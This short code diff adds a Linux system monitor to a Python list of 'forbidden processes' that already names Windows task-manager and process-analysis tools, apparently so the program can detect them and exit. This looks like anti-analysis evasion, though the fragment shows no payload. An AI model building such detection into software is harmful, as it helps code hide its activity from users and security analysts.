@@ -4,7 +4,8 @@ from modules import Exit
 
 
 forbidden_processes = ['taskmgr.exe', 'resmon.exe', 'perfmon.exe', 'procexp64.exe', 'procexp.exe',
-                       'processhacker.exe', 'systeminformer.exe', 'procmon.exe', 'depends.exe', 'apimonitor.exe']
+                       'processhacker.exe', 'systeminformer.exe', 'procmon.exe', 'depends.exe', 'apimonitor.exe',
+                       'gnome-system-monitor']
 timeout_value = 0.3
 
 
